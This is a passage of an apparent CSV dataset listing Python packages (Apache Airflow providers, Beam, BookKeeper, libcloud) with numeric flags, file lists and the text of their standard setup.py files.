# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-ssh package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-ssh setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.ssh', 'airflow.providers.ssh.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-tableau-3.0.1,0,1,1,1,1,0,0,0,get_provider_info.py tableau.py __init__.py tableau.py tableau_refresh_workbook.py __init__.py tableau.py tableau_job_status.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-tableau package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.1'


def do_setup():
    """"""Perform the package apache-airflow-providers-tableau setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.tableau', 'airflow.providers.tableau.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",0
apache-airflow-providers-telegram-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py telegram.py __init__.py telegram.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-telegram package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-telegram setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.telegram', 'airflow.providers.telegram.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",0
apache_atlas-0.0.11,0,1,1,1,1,0,1,0,admin.py base_client.py discovery.py entity.py glossary.py lineage.py relationship.py typedef.py __init__.py exceptions.py admin.py discovery.py enums.py glossary.py instance.py lineage.py metrics.py misc.py profile.py relationship.py typedef.py __init__.py utils.py __init__.py LICENSE METADATA RECORD top_level.txt WHEEL,,1
apache-beam-2.40.0,0,1,1,1,1,0,0,0,avro_record.py coders.py coders_test.py coders_test_common.py coder_impl.pxd coder_impl.py fast_coders_test.py observable.py observable_test.py proto2_coder_test_messages_pb2.py row_coder.py row_coder_test.py slow_coders_test.py slow_stream.py standard_coders_test.py stream.pxd stream.pyx stream_test.py typecoders.py typecoders_test.py __init__.py convert.py convert_test.py doctests.py doctests_test.py expressions.py expressions_test.py frames.py frames_test.py frame_base.py frame_base_test.py io.py io_test.py pandas_docs_test.py pandas_doctests_test.py pandas_top_level_functions.py partitionings.py partitionings_test.py schemas.py schemas_test.py transforms.py transforms_test.py __init__.py error.py avro_bitcoin.py autocomplete.py autocomplete_it_test.py autocomplete_test.py distribopt.py distribopt_test.py estimate_pi.py estimate_pi_it_test.py estimate_pi_test.py game_stats.py game_stats_it_test.py game_stats_test.py hourly_team_score.py hourly_team_score_it_test.py hourly_team_score_test.py leader_board.py leader_board_it_test.py leader_board_test.py user_score.py user_score_it_test.py user_score_test.py __init__.py juliaset.py juliaset_test.py juliaset_test_it.py __init__.py juliaset_main.py setup.py __init__.py tfidf.py tfidf_test.py top_wikipedia_sessions.py top_wikipedia_sessions_it_test.py top_wikipedia_sessions_test.py __init__.py bigquery_schema.py bigquery_side_input.py bigquery_side_input_it_test.py bigquery_side_input_test.py bigquery_tornadoes.py bigquery_tornadoes_it_test.py bigquery_tornadoes_test.py bigtableio_it_test.py coders.py coders_it_test.py coders_test.py combiners_test.py custom_ptransform.py custom_ptransform_test.py datastore_wordcount.py datastore_wordcount_it_test.py filters.py filters_test.py group_with_coder.py group_with_coder_test.py mergecontacts.py mergecontacts_test.py multiple_output_pardo.py multiple_output_pardo_test.py __init__.py flight_delays.py flight_delays_it_test.py taxiride.py taxiride_it_test.py taxiride_test.py wordcount.py wordcount_test.py __init__.py fastavro_it_test.py flink_streaming_impulse.py __init__.py pytorch_image_classification.py pytorch_image_segmentation.py pytorch_language_modeling.py sklearn_mnist_classification.py __init__.py kafka_taxi.py __init__.py matrix_power.py matrix_power_test.py snippets.py snippets_test.py cogroupbykey.py cogroupbykey_test.py combineglobally.py combineglobally_test.py combineperkey.py combineperkey_test.py combinevalues.py combinevalues_test.py count.py count_test.py distinct.py distinct_test.py groupbykey.py groupbykey_test.py groupby_test.py groupintobatches.py groupintobatches_test.py latest.py latest_test.py max.py max_test.py mean.py mean_test.py min.py min_test.py sample.py sample_test.py sum.py sum_test.py top.py top_test.py __init__.py filter.py filter_test.py flatmap.py flatmap_test.py keys.py keys_test.py kvswap.py kvswap_test.py map.py map_test.py pardo.py pardo_test.py partition.py partition_test.py regex.py regex_test.py tostring.py tostring_test.py values.py values_test.py withtimestamps.py withtimestamps_test.py __init__.py __init__.py util.py util_test.py __init__.py sql_taxi.py streaming_wordcount.py streaming_wordcount_debugging.py streaming_wordcount_debugging_it_test.py streaming_wordcount_debugging_test.py streaming_wordcount_it_test.py windowed_wordcount.py wordcount.py wordcount_dataframe.py wordcount_debugging.py wordcount_debugging_test.py wordcount_it_test.py wordcount_minimal.py wordcount_minimal_test.py wordcount_test.py wordcount_with_metrics.py wordcount_xlang.py wordcount_xlang_sql.py __init__.py cloudpickle_pickler.py cloudpickle_pickler_test.py dill_pickler.py auth.py json_value.py json_value_test.py __init__.py http_client.py http_client_test.py cells.py cells_test.py metric.py metric_test.py __init__.py module_test.py pickler.py pickler_test.py util.py util_test.py __init__.py avroio.py avroio_test.py boto3_client.py client_test.py fake_client.py messages.py __init__.py __init__.py s3filesystem.py s3filesystem_test.py s3io.py s3io_test.py __init__.py blobstoragefilesystem.py blobstoragefilesystem_test.py blobstorageio.py blobstorageio_test.py __init__.py concat_source.py concat_source_test.py debezium.py pubsub.py __init__.py generate_sequence.py generate_sequence_test.py kafka.py snowflake.py xlang_debeziumio_it_test.py xlang_jdbcio_it_test.py xlang_kafkaio_it_test.py xlang_kinesisio_it_test.py xlang_parquetio_test.py xlang_snowflakeio_it_test.py __init__.py filebasedsink.py filebasedsink_test.py filebasedsource.py filebasedsource_test.py fileio.py fileio_test.py filesystem.py filesystemio.py filesystemio_test.py filesystems.py filesystems_test.py filesystem_test.py flink_streaming_impulse_source.py flink_streaming_impulse_source_test.py __init__.py bigquery.py bigquery_avro_tools.py bigquery_avro_tools_test.py bigquery_file_loads.py bigquery_file_loads_test.py bigquery_io_metadata.py bigquery_io_metadata_test.py bigquery_io_read_it_test.py bigquery_io_read_pipeline.py bigquery_json_it_test.py bigquery_read_internal.py bigquery_read_it_test.py bigquery_read_perf_test.py bigquery_test.py bigquery_tools.py bigquery_tools_test.py bigquery_write_it_test.py bigquery_write_perf_test.py bigtableio.py bigtableio_test.py big_query_query_to_table_it_test.py big_query_query_to_table_pipeline.py adaptive_throttler.py adaptive_throttler_test.py datastoreio.py datastoreio_test.py datastore_write_it_pipeline.py datastore_write_it_test.py helper.py query_splitter.py query_splitter_test.py rampup_throttling_fn.py rampup_throttling_fn_test.py types.py types_test.py util.py util_test.py __init__.py __init__.py dicomclient.py dicomio.py dicomio_integration_test.py dicomio_test.py spannerio.py spannerio_read_it_test.py spannerio_read_perf_test.py spannerio_test.py spannerio_write_it_test.py spannerio_write_perf_test.py __init__.py gce_metadata_util.py gcsfilesystem.py gcsfilesystem_test.py gcsio.py gcsio_integration_test.py gcsio_overrides.py gcsio_test.py bigquery_v2_client.py bigquery_v2_messages.py __init__.py storage_v1_client.py storage_v1_messages.py __init__.py __init__.py __init__.py pubsub.py external.py proto_api.py __init__.py pubsub_integration_test.py pubsub_io_perf_test.py pubsub_it_pipeline.py pubsub_test.py resource_identifiers.py spanner.py bigquery_matcher.py bigquery_matcher_test.py pubsub_matcher.py pubsub_matcher_test.py utils.py utils_test.py xlang_spannerio_it_test.py __init__.py __init__.py hadoopfilesystem.py hadoopfilesystem_test.py iobase.py iobase_test.py jdbc.py kafka.py kinesis.py localfilesystem.py localfilesystem_test.py mongodbio.py mongodbio_it_test.py mongodbio_test.py parquetio.py parquetio_it_test.py parquetio_test.py range_trackers.py range_trackers_test.py restriction_trackers.py restriction_trackers_test.py snowflake.py sources_test.py source_test_utils.py source_test_utils_test.py textio.py textio_test.py tfrecordio.py tfrecordio_test.py utils.py utils_test.py watermark_estimators.py watermark_estimators_test.py __init__.py cells.pxd cells.py cells_test.py execution.pxd execution.py execution_test.py metric.py metricbase.py metric_test.py monitoring_infos.py monitoring_infos_test.py __init__.py cloud_dlp.py cloud_dlp_it_test.py cloud_dlp_test.py naturallanguageml.py naturallanguageml_test.py naturallanguageml_test_it.py recommendations_ai.py recommendations_ai_test.py recommendations_ai_test_it.py videointelligenceml.py videointelligenceml_test.py videointelligenceml_test_it.py visionml.py visionml_test.py visionml_test_it.py __init__.py base.py base_test.py pytorch_inference.py pytorch_inference_it_test.py pytorch_inference_test.py sklearn_inference.py sklearn_inference_it_test.py sklearn_inference_test.py __init__.py __init__.py pipeline_options.py pipeline_options_test.py pipeline_options_validator.py pipeline_options_validator_test.py value_provider.py value_provider_test.py __init__.py pipeline.py pipeline_test.py beam_fn_api_pb2.py beam_fn_api_pb2.pyi beam_fn_api_pb2_grpc.py beam_provision_api_pb2.py beam_provision_api_pb2.pyi beam_provision_api_pb2_grpc.py __init__.py __init__.py beam_interactive_api_pb2.py beam_interactive_api_pb2.pyi beam_interactive_api_pb2_grpc.py __init__.py __init__.py beam_artifact_api_pb2.py beam_artifact_api_pb2.pyi beam_artifact_api_pb2_grpc.py beam_artifact_api_pb2_urns.py beam_expansion_api_pb2.py beam_expansion_api_pb2.pyi beam_expansion_api_pb2_grpc.py beam_job_api_pb2.py beam_job_api_pb2.pyi beam_job_api_pb2_grpc.py __init__.py __init__.py beam_runner_api_pb2.py beam_runner_api_pb2.pyi beam_runner_api_pb2_grpc.py beam_runner_api_pb2_urns.py endpoints_pb2.py endpoints_pb2.pyi endpoints_pb2_grpc.py external_transforms_pb2.py external_transforms_pb2.pyi external_transforms_pb2_grpc.py external_transforms_pb2_urns.py metrics_pb2.py metrics_pb2.pyi metrics_pb2_grpc.py metrics_pb2_urns.py schema_pb2.py schema_pb2.pyi schema_pb2_grpc.py schema_pb2_urns.py standard_window_fns_pb2.py standard_window_fns_pb2.pyi standard_window_fns_pb2_grpc.py standard_window_fns_pb2_urns.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py standard_coders.yaml __init__.py common_urns.py python_urns.py utils.py __init__.py pvalue.py pvalue_test.py common.pxd common.py common_test.py dataflow_exercise_metrics_pipeline.py dataflow_exercise_metrics_pipeline_test.py dataflow_exercise_streaming_metrics_pipeline.py dataflow_exercise_streaming_metrics_pipeline_test.py dataflow_job_service.py dataflow_job_service_test.py dataflow_metrics.py dataflow_metrics_test.py dataflow_runner.py dataflow_runner_test.py apiclient.py apiclient_test.py cloudbuild_v1_client.py cloudbuild_v1_messages.py __init__.py dataflow_v1b3_client.py dataflow_v1b3_messages.py message_matchers.py message_matchers_test.py __init__.py __init__.py names.py __init__.py iobase.py iobase_test.py __init__.py ptransform_overrides.py template_runner_test.py test_dataflow_runner.py __init__.py bundle_factory.py clock.py consumer_tracking_pipeline_visitor.py consumer_tracking_pipeline_visitor_test.py direct_metrics.py direct_metrics_test.py direct_runner.py direct_runner_test.py direct_userstate.py evaluation_context.py executor.py helper_transforms.py sdf_direct_runner.py sdf_direct_runner_test.py test_direct_runner.py test_stream_impl.py transform_evaluator.py util.py watermark_manager.py __init__.py augmented_pipeline.py augmented_pipeline_test.py background_caching_job.py background_caching_job_test.py cache_manager.py cache_manager_test.py cacheable.py expression_cache.py expression_cache_test.py read_cache.py read_cache_test.py reify.py streaming_cache.py streaming_cache_test.py write_cache.py write_cache_test.py __init__.py dataproc_cluster_manager.py dataproc_cluster_manager_test.py types.py __init__.py display_manager.py interactive_pipeline_graph.py pcoll_visualization.py pcoll_visualization_test.py pipeline_graph.py pipeline_graph_renderer.py pipeline_graph_test.py __init__.py interactive_beam.py interactive_beam_test.py interactive_environment.py interactive_environment_test.py interactive_runner.py interactive_runner_test.py interactive_environment_inspector.py interactive_environment_inspector_test.py __init__.py capture_control.py capture_control_test.py capture_limiters.py capture_limiters_test.py interactive_options.py __init__.py pipeline_fragment.py pipeline_fragment_test.py pipeline_instrument.py pipeline_instrument_test.py recording_manager.py recording_manager_test.py beam_sql_magics.py beam_sql_magics_test.py sql_chain.py sql_chain_test.py utils.py utils_test.py __init__.py notebook_executor.py screen_diff.py __init__.py mock_env.py mock_ipython.py pipeline_assertion.py test_cache_manager.py __init__.py user_pipeline_tracker.py user_pipeline_tracker_test.py utils.py utils_test.py __init__.py names.py __init__.py manager.py utils.py __init__.py pipeline_context.py pipeline_context_test.py abstract_job_service.py artifact_service.py artifact_service_test.py expansion_service.py expansion_service_main.py expansion_service_test.py flink_runner.py flink_runner_test.py flink_uber_jar_job_server.py flink_uber_jar_job_server_test.py execution.py fn_runner.py fn_runner_test.py translations.py translations_test.py trigger_manager.py trigger_manager_test.py visualization_tools.py watermark_manager.py worker_handlers.py __init__.py job_server.py job_server_test.py local_job_service.py local_job_service_main.py local_job_service_test.py portable_metrics.py portable_runner.py portable_runner_test.py requirements_cache_it_test.py samza_runner_test.py sdk_container_builder.py sdk_container_builder_test.py spark_java_job_server_test.py spark_runner.py spark_runner_test.py spark_uber_jar_job_server.py spark_uber_jar_job_server_test.py stager.py stager_test.py __init__.py runner.py runner_test.py sdf_utils.py sdf_utils_test.py __init__.py bundle_processor.py bundle_processor_test.py channel_factory.py crossplatform_time.h crossplatform_unistd.h data_plane.py data_plane_test.py logger.py logger_test.py log_handler.py log_handler_test.py opcounters.pxd opcounters.py opcounters_test.py operations.pxd operations.py operation_specs.py sdk_worker.py sdk_worker_main.py sdk_worker_main_test.py sdk_worker_test.py sideinputs.py sideinputs_test.py statecache.py statecache_test.py statesampler.py statesampler_fast.pxd statesampler_fast.pyx statesampler_slow.py statesampler_test.py worker_id_interceptor.py worker_id_interceptor_test.py worker_pool_main.py worker_status.py worker_status_test.py __init__.py __init__.py preprocess.py process_tfma.py setup.py tfdv_analyze_and_validate.py model.py task.py taxi.py __init__.py __init__.py auction_bid.py field_name.py nexmark_model.py __init__.py monitor.py nexmark_launcher.py nexmark_perf.py nexmark_util.py nexmark_query_util.py query0.py query1.py query10.py query11.py query12.py query2.py query3.py query4.py query5.py query6.py query7.py query8.py query9.py winning_bids.py __init__.py __init__.py __init__.py trigger_transcripts.yaml datatype_inference.py datatype_inference_test.py extra_assertions.py extra_assertions_test.py combine_test.py co_group_by_key_test.py group_by_key_test.py load_test.py load_test_metrics_utils.py microbenchmarks_test.py pardo_test.py sideinput_test.py __init__.py metric_result_matchers.py metric_result_matchers_test.py pipeline_verifiers.py pipeline_verifiers_test.py synthetic_pipeline.py synthetic_pipeline_test.py test_pipeline.py test_pipeline_test.py test_stream.py test_stream_it_test.py test_stream_service.py test_stream_service_test.py test_stream_test.py test_utils.py test_utils_test.py util.py util_test.py __init__.py coders_microbenchmark.py distribution_counter_microbenchmark.py fn_api_runner_microbenchmark.py map_fn_microbenchmark.py microbenchmarks_test.py runtime_type_check_microbenchmark.py sideinput_microbenchmark.py teststream_microbenchmark.py utils.py __init__.py batch_dofn_test.py combinefn_lifecycle_pipeline.py combinefn_lifecycle_test.py combiners.py combiners_test.py core.py create_source.py create_test.py cy_combiners.pxd cy_combiners.py cy_dataflow_distribution_counter.pxd cy_dataflow_distribution_counter.pyx dataflow_distribution_counter_test.py deduplicate.py deduplicate_test.py display.py display_test.py dofn_lifecycle_test.py environments.py environments_test.py external.py external_it_test.py external_java.py external_test.py fully_qualified_named_transform.py fully_qualified_named_transform_test.py periodicsequence.py periodicsequence_test.py ptransform.py ptransform_test.py py_dataflow_distribution_counter.py resources.py resources_test.py sideinputs.py sideinputs_test.py sql.py sql_test.py stats.pxd stats.py stats_test.py timeutil.py transforms_keyword_only_args_test.py trigger.py trigger_test.py userstate.py userstate_test.py util.py util_test.py validate_runner_xlang_test.py window.py window_test.py write_ptransform_test.py __init__.py batch.py batch_test.py decorators.py decorators_test.py native_type_compatibility.py native_type_compatibility_test.py opcodes.py row_type.py schemas.py schemas_test.py sharded_key_type.py sharded_key_type_test.py trivial_inference.py trivial_inference_test.py typecheck.py typecheck_test.py typed_pipeline_test.py typehints.py typehints_test.py __init__.py annotations.py annotations_test.py counters.pxd counters.py counters_test.py histogram.py histogram_test.py interactive_utils.py interactive_utils_test.py plugin.py processes.py processes_test.py profiler.py profiler_test.py proto_utils.py python_callable.py python_callable_test.py retry.py retry_test.py sentinel.py sharded_key.py shared.py shared_test.py subprocess_server.py subprocess_server_test.py thread_pool_executor.py thread_pool_executor_test.py timestamp.py timestamp_test.py urns.py windowed_value.pxd windowed_value.py windowed_value_test.py __init__.py version.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt gen_protos.py MANIFEST.in PKG-INFO setup.cfg setup.py,,1
apache-bookkeeper-client-4.15.0,0,1,1,1,1,0,0,0,dependency_links.txt namespace_packages.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt client.py exceptions.py namespace.py namespaces.py __init__.py constants.py datetime_helpers.py exceptions.py base.py polling.py _helpers.py __init__.py general_helpers.py grpc_helpers.py method.py protobuf_helpers.py retry.py router.py __init__.py service_uri.py timeout.py util.py __init__.py client.py exceptions.py futures.py table.py __init__.py cluster_pb2.py common_pb2.py kv_pb2.py kv_rpc_pb2.py kv_rpc_pb2_grpc.py kv_store_pb2.py storage_pb2.py storage_pb2_grpc.py stream_pb2.py __init__.py types.py __init__.py PKG-INFO README.rst setup.cfg setup.py,"# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import io
import os

import setuptools

# Package metadata.

name = 'apache-bookkeeper-client'
description = 'Apache BookKeeper client library'
version = '4.15.0'
# Should be one of:
# 'Development Status :: 3 - Alpha'
# 'Development Status :: 4 - Beta'
# 'Development Status :: 5 - Production/Stable'
release_status = 'Development Status :: 3 - Alpha'
dependencies = [
    'protobuf>=3.0.0',
    'setuptools>=34.0.0',
    'six>=1.10.0',
    'pytz',
    'futures>=3.2.0;python_version<""3.2""',
    'grpcio<1.28,>=1.8.2',
    'pymmh3>=0.0.5'
]
extras = {
}

# Setup boilerplate below this line.

package_root = os.path.abspath(os.path.dirname(__file__))

readme_filename = os.path.join(package_root, 'README.rst')
with io.open(readme_filename, encoding='utf-8') as readme_file:
    readme = readme_file.read()

# Only include packages under the 'bookkeeper' namespace. Do not include tests,
# benchmarks, etc.
packages = [
    package for package in setuptools.find_packages()
    if package.startswith('bookkeeper')]

# Determine which namespaces are needed.
namespaces = ['bookkeeper']

setuptools.setup(
    name=name,
    version=version,
    description=description,
    long_description=readme,
    author='Apache BookKeeper',
    author_email='dev@bookkeeper.apache.org',
    license='Apache 2.0',
    url='https://github.com/apache/bookkeeper/tree/master/stream/clients/python',
    classifiers=[
        release_status,
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Operating System :: OS Independent',
        'Topic :: Internet',
    ],
    platforms='Posix; MacOS X; Windows',
    packages=packages,
    namespace_packages=namespaces,
    install_requires=dependencies,
    extras_require=extras,
    include_package_data=True,
    zip_safe=False,
)
",1
apache-libcloud-3.6.0,1,1,1,1,1,0,0,0,.pylintrc dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst compute_demo.py example_aliyun_ecs.py example_aliyun_oss.py example_aliyun_slb.py example_openstack.py gce_demo.py secrets.py-dist __init__.py example_compute.py example_container.py example_dns.py example_loadbalancer.py example_storage.py base.py dimensiondata.py dummy.py ebs.py gce.py __init__.py providers.py types.py __init__.py base.py abiquo.py aliyun.py aws.py azure.py azure_arm.py base.py brightbox.py buddyns.py cloudsigma.py cloudstack.py digitalocean.py dimensiondata.py dnsimple.py dnspod.py durabledns.py exceptions.py gandi.py gandi_live.py gig_g8.py gogrid.py google.py gridscale.py hostvirtual.py kubernetes.py linode.py liquidweb.py luadns.py maxihost.py nfsn.py nsone.py nttcis.py onapp.py openstack.py openstack_identity.py osc.py ovh.py pointdns.py providers.py rackspace.py softlayer.py types.py upcloud.py vultr.py worldwidedns.py xmlrpc.py zonomi.py __init__.py base.py ec2_instance_types.py ec2_region_details_complete.py ec2_region_details_partial.py __init__.py deployment.py deprecated.py abiquo.py auroracompute.py azure.py azure_arm.py bluebox.py brightbox.py bsnl.py cloudscale.py cloudsigma.py cloudstack.py cloudwatt.py digitalocean.py dimensiondata.py dummy.py ec2.py ecp.py ecs.py elastichosts.py elasticstack.py equinixmetal.py exoscale.py gandi.py gce.py gig_g8.py gogrid.py gridscale.py gridspot.py hostvirtual.py ikoula.py indosat.py internetsolutions.py joyent.py kamatera.py kili.py ktucloud.py kubevirt.py libvirt_driver.py linode.py maxihost.py medone.py nephoscale.py ntta.py nttcis.py onapp.py oneandone.py opennebula.py openstack.py outscale.py ovh.py profitbricks.py rackspace.py rimuhosting.py scaleway.py serverlove.py skalicloud.py softlayer.py upcloud.py vcl.py vcloud.py voxel.py vpsnet.py vsphere.py vultr.py __init__.py providers.py ssh.py types.py __init__.py base.py docker.py dummy.py ecs.py gke.py joyent.py kubernetes.py lxd.py rancher.py __init__.py providers.py types.py docker.py __init__.py __init__.py pricing.json pricing.json.sha256 pricing.json.sha512 base.py auroradns.py buddyns.py cloudflare.py digitalocean.py dnsimple.py dnspod.py dummy.py durabledns.py gandi.py gandi_live.py godaddy.py google.py hostvirtual.py linode.py liquidweb.py luadns.py nfsn.py nsone.py onapp.py pointdns.py powerdns.py rackspace.py rcodezero.py route53.py softlayer.py vultr.py worldwidedns.py zerigo.py zonomi.py __init__.py providers.py types.py __init__.py http.py base.py alb.py brightbox.py cloudstack.py dimensiondata.py elb.py gce.py gogrid.py ninefold.py nttcis.py rackspace.py slb.py softlayer.py __init__.py providers.py types.py __init__.py pricing.py py.typed security.py base.py atmos.py auroraobjects.py azure_blobs.py backblaze_b2.py cloudfiles.py digitalocean_spaces.py dummy.py google_storage.py ktucloud.py local.py minio.py nimbus.py ninefold.py oss.py rgw.py s3.py scaleway.py __init__.py providers.py types.py __init__.py oec_0_9_myaccount.xml server_server.xml server_server_e75ead52_692f_4314_8725_c8a4f4d13a87.xml server_server_e75ead52_692f_4314_8725_c8a4f4d13a87_DEFAULT.xml server_server_NOBACKUP.xml _backup_client_30b1ff76_c76d_4d7c_b39d_3b72be0384c8_cancelJob.xml _backup_client_30b1ff76_c76d_4d7c_b39d_3b72be0384c8_cancelJob_FAIL.xml _backup_client_schedulePolicy.xml _backup_client_storagePolicy.xml _backup_client_SUCCESS_PUT.xml _backup_client_type.xml _backup_DISABLE.xml _backup_ENABLE.xml _backup_EXISTS.xml _backup_INFO.xml _backup_INFO_DISABLED.xml _backup_INFO_NOCLIENT.xml _backup_INFO_NOJOB.xml _backup_modify.xml _remove_backup_client.xml _remove_backup_client_FAIL.xml test_dimensiondata_v2_3.py test_dimensiondata_v2_4.py __init__.py _v1_events_12345670.json _v1_events_12345670_UNAUTHORIZED.json _v2_account.json _v2_account_UNAUTHORIZED.json _v2_actions.json _v2_actions_12345670.json _v2_actions_page_1.json _v2_actions_page_2.json pkey.json pkey.pem pkey_invalid.json pkey_invalid.pem test_aliyun.py test_aws.py test_azure.py test_base.py test_base_driver.py test_cloudstack.py test_digitalocean_v2.py test_gandi.py test_gandi_live.py test_google.py test_kubernetes.py test_nfsn.py test_openstack.py test_openstack_identity.py test_osc.py test_ovh.py test_retry_limit.py test_upcloud.py __init__.py dcs.xml ent_1.xml ent_1_dcreps.xml ent_1_dcrep_2.xml ent_1_dcrep_2_templates.xml ent_1_dcrep_2_template_11.xml login.xml not_found_error.xml privilege_errors.html unauthorized_user.html vdcs.xml vdc_4.xml vdc_4_vapps.xml vdc_4_vapp_5.xml vdc_4_vapp_5_needs_sync.xml vdc_4_vapp_5_vms.xml vdc_4_vapp_5_vm_3_not_allocated.xml vdc_4_vapp_6.xml vdc_4_vapp_6_undeploy.xml vdc_4_vapp_6_undeploy_task.xml vdc_4_vapp_6_undeploy_task_failed.xml vdc_4_vapp_6_vms.xml vdc_4_vapp_6_vms_allocated.xml vdc_4_vapp_6_vm_3.xml vdc_4_vapp_6_vm_3_allocated.xml vdc_4_vapp_6_vm_3_deploy.xml vdc_4_vapp_6_vm_3_deployed.xml vdc_4_vapp_6_vm_3_deploy_task.xml vdc_4_vapp_6_vm_3_deploy_task_failed.xml vdc_4_vapp_6_vm_3_nics.xml vdc_4_vapp_6_vm_3_reset.xml vdc_4_vapp_6_vm_3_reset_task.xml vdc_4_vapp_6_vm_3_undeploy.xml vdc_4_vapp_6_vm_3_undeploy_task.xml vdc_4_vapp_6_vm_3_undeploy_task_failed.xml vdc_4_vapp_6_vm_creation_ok.xml vdc_4_vapp_creation_ok.xml libcloud.pem _3761b98b_673d_526c_8d55_fee918758e6e_locations.xml _3761b98b_673d_526c_8d55_fee918758e6e_operations_acc33f6756cda6fd96826394fce4c9f3.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest01.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest01_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest01_deployments_dc03_roleinstances_dc13.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest02_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest03.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest03_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_dcoddkinztest04.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_oddkinz1_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_oddkinz2_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_oddkinz5_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdc1234.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc2.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc2_deployments.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc2_deploymentslots_Production.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_hostedservices_testdcabc_deployments.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_images.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_storageservices_dss123.xml _3761b98b_673d_526c_8d55_fee918758e6e_services_vmimages.xml _77777777_7777_7777_7777_777777777777_oauth2_token.json 